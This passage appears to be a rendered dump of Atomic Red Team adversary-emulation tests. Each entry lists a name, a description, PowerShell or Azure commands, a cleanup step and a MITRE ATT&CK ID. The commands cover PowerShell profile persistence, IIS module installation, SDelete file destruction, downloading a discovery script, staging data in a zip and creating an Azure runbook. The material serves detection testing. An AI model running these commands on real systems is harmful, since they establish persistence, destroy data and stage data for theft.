<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 090e5aa5-32b6-473b-a49b-21e843a56896</li>
<li><strong>name</strong>: Append malicious start-process cmdlet</li>
<li>
<p><strong>description</strong>: Appends a start process cmdlet to the current user's powershell profile pofile that points to a malicious executable. Upon execution, calc.exe will be launched.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Add-Content #{ps_profile} -Value ""
Add-Content #{ps_profile} -Value "Start-Process #{exe_path}"
powershell -Command exit</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (Test-Path #{ps_profile}) {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Path #{ps_profile} -Type File -Force</p>
</li>
<li>
<p><strong>cleanup_command</strong>: $oldprofile = cat $profile | Select-Object -skiplast 1
Set-Content $profile -Value $oldprofile</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1546.013</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: a9030b20-dd4b-4405-875e-3462c6078fdc</li>
<li><strong>name</strong>: Get-EventLog To Enumerate Windows Security Log</li>
<li><strong>description</strong>: Uses the built-in PowerShell commandlet Get-EventLog to search for 'SYSTEM' keyword and saves results to a text file.</li>
</ul>
<p>This technique was observed in a <a href="https://thedfirreport.com/2023/04/03/malicious-iso-file-leads-to-domain-wide-ransomware/">TheDFIRReport case</a> 
where the threat actor enumerated the Windows Security audit log to determine user accounts and associated IPv4 addresses.</p>
<p>Successful execution will save matching log events to the users temp folder.
- <strong>platforms</strong>: ['windows']
- <strong>command</strong>: powershell -c {get-eventlog 'Security' | where {$_.Message -like '<em>SYSTEM</em>'} | export-csv $env:temp\T1654_events.txt}
- <strong>prereq_command</strong>: 
- <strong>get_prereq_command</strong>: 
- <strong>cleanup_command</strong>: powershell -c "remove-item $env:temp\T1654_events.txt -ErrorAction Ignore"
- <strong>mitre_id</strong>: T1654
- <strong>input_arguments.output_file</strong>: None
- <strong>input_arguments.script_path</strong>: None
- <strong>input_arguments.python_script</strong>: None
- <strong>input_arguments.pid_term</strong>: None
- <strong>input_arguments.MimiPenguin_Location</strong>: None
- <strong>input_arguments.autoit_path</strong>: None
- <strong>input_arguments.server_ip</strong>: None
- <strong>input_arguments.client_path</strong>: None
- <strong>input_arguments.server_port</strong>: None
- <strong>input_arguments.file_to_pad</strong>: None
- <strong>input_arguments.executable_binary</strong>: None
- <strong>input_arguments.command_to_execute</strong>: None
- <strong>input_arguments.file_path</strong>: None
- <strong>input_arguments.uacme_exe</strong>: None
- <strong>input_arguments.commandpath</strong>: None
- <strong>input_arguments.commandtorun</strong>: None
- <strong>input_arguments.shortcut_file_path</strong>: None
- <strong>input_arguments.cloudtrail_name</strong>: None
- <strong>input_arguments.s3_bucket_name</strong>: None
- <strong>input_arguments.region</strong>: None
- <strong>input_arguments.username</strong>: None
- <strong>input_arguments.password</strong>: None
- <strong>input_arguments.event_hub_name</strong>: None
- <strong>input_arguments.resource_group</strong>: None
- <strong>input_arguments.name_space_name</strong>: None
- <strong>input_arguments.stratus_path</strong>: None
- <strong>input_arguments.aws_region</strong>: None
- <strong>input_arguments.cloudwatch_log_group_name</strong>: None
- <strong>input_arguments.cloudwatch_log_stream_name</strong>: None
- <strong>input_arguments.target_email</strong>: None
- <strong>input_arguments.project-id</strong>: None
- <strong>input_arguments.ms_product</strong>: None
- <strong>input_arguments.syslog_path</strong>: None
- <strong>input_arguments.macos_audit_path</strong>: None
- <strong>input_arguments.system_log_path</strong>: None
- <strong>input_arguments.system_log_name1</strong>: None
- <strong>input_arguments.system_log_name2</strong>: None
- <strong>input_arguments.system_log_name3</strong>: None
- <strong>input_arguments.system_log_folder</strong>: None
- <strong>input_arguments.journal_folder</strong>: None
- <strong>input_arguments.log_path</strong>: None
- <strong>input_arguments.1st_target_mailbox</strong>: None
- <strong>input_arguments.2nd_target_mailbox</strong>: None
- <strong>input_arguments.3rd_target_mailbox</strong>: None
- <strong>input_arguments.ticket</strong>: None
- <strong>input_arguments.mimikatz_exe</strong>: None
- <strong>input_arguments.target</strong>: None
- <strong>input_arguments.user_name</strong>: None
- <strong>input_arguments.domain</strong>: None
- <strong>input_arguments.rubeus_url</strong>: None
- <strong>input_arguments.history_path</strong>: None
- <strong>input_arguments.dest_path</strong>: None
- <strong>input_arguments.package_checker</strong>: None
- <strong>input_arguments.package_installer</strong>: None
- <strong>input_arguments.flavor_command</strong>: None
- <strong>input_arguments.cleanup_command</strong>: None
- <strong>input_arguments.falcond_plist</strong>: None
- <strong>input_arguments.userdaemon_plist</strong>: None</p>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: cc3381fb-4bd0-405c-a8e4-6cacfac3b06c</li>
<li><strong>name</strong>: Install IIS Module using PowerShell Cmdlet New-WebGlobalModule</li>
<li>
<p><strong>description</strong>: The following Atomic will utilize PowerShell Cmdlet New-WebGlobalModule to install a new IIS Module. IIS must be installed.
This atomic utilizes a DLL on disk, but to test further suspiciousness, compile and load <a href="https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/">IIS-Raid</a>.
A successful execution will install a module into IIS using New-WebGlobalModule.
<a href="https://learn.microsoft.com/en-us/powershell/module/webadministration/set-webglobalmodule?view=windowsserver2022-ps">Managing IIS Modules with PowerShell</a>
<a href="https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/">IIS Modules</a></p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: New-WebGlobalModule -Name #{module_name} -Image #{dll_path}</p>
</li>
<li>
<p><strong>prereq_command</strong>: $service = get-service w3svc -ErrorAction SilentlyContinue
if($service){ Write-Host "IIS installed on $env:computername" } else { Write-Host "IIS is not installed on $env:computername" } </p>
</li>
<li>
<p><strong>get_prereq_command</strong>: Install IIS to continue.</p>
</li>
<li>
<p><strong>cleanup_command</strong>: Remove-WebGlobalModule -Name #{module_name}</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1505.004</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 476419b5-aebf-4366-a131-ae3e8dae5fc2</li>
<li><strong>name</strong>: Windows - Overwrite file with SysInternals SDelete</li>
<li>
<p><strong>description</strong>: Overwrites and deletes a file using SysInternals SDelete. Upon successful execution, "Files deleted: 1" will be displayed in
the powershell session along with other information about the file that was deleted.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: if (-not (Test-Path "#{file_to_delete}")) { New-Item "#{file_to_delete}" -Force }
&amp; "#{sdelete_exe}" -accepteula "#{file_to_delete}"</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (Test-Path "#{sdelete_exe}") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Type Directory "PathToAtomicsFolder..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://download.sysinternals.com/files/SDelete.zip" -OutFile "PathToAtomicsFolder..\ExternalPayloads\SDelete.zip"
Expand-Archive "PathToAtomicsFolder..\ExternalPayloads\SDelete.zip" "PathToAtomicsFolder..\ExternalPayloads\Sdelete" -Force
Remove-Item "PathToAtomicsFolder..\ExternalPayloads\SDelete.zip" -Force</p>
</li>
<li>
<p><strong>cleanup_command</strong>: </p>
</li>
<li><strong>mitre_id</strong>: T1485</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 107706a5-6f9f-451a-adae-bab8c667829f</li>
<li><strong>name</strong>: Stage data from Discovery.bat</li>
<li>
<p><strong>description</strong>: Utilize powershell to download discovery.bat and save to a local file. This emulates an attacker downloading data collection tools onto the host. Upon execution,
verify that the file is saved in the temp directory.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat" -OutFile #{output_file}</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Remove-Item -Force #{output_file} -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1074.001</p>
</li>
<li><strong>input_arguments.output_file</strong>: {'description': 'Location to save downloaded discovery.bat file', 'type': 'path', 'default': '$env:TEMP\discovery.bat'}</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: a57fbe4b-3440-452a-88a7-943531ac872a</li>
<li><strong>name</strong>: Zip a Folder with PowerShell for Staging in Temp</li>
<li>
<p><strong>description</strong>: Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration. Upon execution, Verify that a zipped folder named Folder_to_zip.zip
was placed in the temp directory.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Compress-Archive -Path "#{input_file}" -DestinationPath #{output_file} -Force</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Remove-Item -Path #{output_file} -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1074.001</p>
</li>
<li><strong>input_arguments.output_file</strong>: {'description': 'Location to save zipped file or folder', 'type': 'path', 'default': '$env:TEMP\Folder_to_zip.zip'}</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 348f4d14-4bd3-4f6b-bd8a-61237f78b3ac</li>
<li><strong>name</strong>: Azure Persistence Automation Runbook Created or Modified</li>
<li>
<p><strong>description</strong>: Identifies when an Azure Automation runbook is created or modified. An adversary may create or modify an Azure
Automation runbook to execute malicious code and maintain persistence in their target's environment.</p>
</li>
<li>
<p><strong>platforms</strong>: ['iaas:azure']</p>
</li>
<li>
<p><strong>command</strong>: New-AzAutomationRunbook -Name #{runbook_name} -Type PowerShell -ResourceGroupName #{resource_group} -Description 'my-test-runbook' -AutomationAccountName #{automation_account_name}</p>
</li>
<li>
<p><strong>prereq_command</strong>: terraform version</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: echo "Please install terraform via https://developer.hashicorp.com/terraform/tutorials/aws-get-started/install-cli (URL accurate as of Nov. 15, 2024)."</p>
</li>
<li>
<p><strong>cleanup_command</strong>: Remove-AzAutomationRunbook -AutomationAccountName #{automation_account_name} -Name #{runbook_name} -ResourceGroupName #{resource_group} -Force
Remove-AzAutomationAccount -ResourceGroupName #{resource_group} -Name #{automation_account_name} -Force
Remove-AzResourceGroup -Name #{resource_group} -Force
echo "Cleanup should be completed. Run 'terraform destroy` to ensure remaining resources are also deleted."
cd "$PathToAtomicsFolder/T1078.004/src/T1078.004-2/"
terraform destroy -auto-approve</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1078.004</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: {'description': 'Name of the resource group', 'type': 'string', 'default': 'ART-ResourceGroupName-T1078-004'}</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
